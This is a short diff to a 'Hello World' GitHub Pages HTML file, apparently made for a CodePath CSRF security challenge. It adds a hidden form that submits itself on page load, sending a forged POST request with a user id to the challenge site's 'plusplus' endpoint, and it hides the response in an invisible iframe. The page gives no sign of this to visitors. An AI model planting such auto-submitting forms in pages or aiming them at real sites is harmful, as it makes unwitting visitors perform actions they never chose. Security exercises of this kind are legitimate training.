@@ -3,5 +3,9 @@
     <body>
         <h1>Hello World!</h1>
         <p>Hosted using Github Pages, very neat!</p>
+        <body onLoad="document.csrfForm.submit()">
+            <form name="csrfForm" style="display: none;" action="https://security.codepath.com/user/csrfchallengeone/plusplus?userid=83f1b6f26db90fb161334394ffc79be211c71755" method="POST" target="hidden_results"></form>
+        <iframe name="hidden_results" style="display: none;">#document</iframe>
+        </body>
     </body>
 </html>
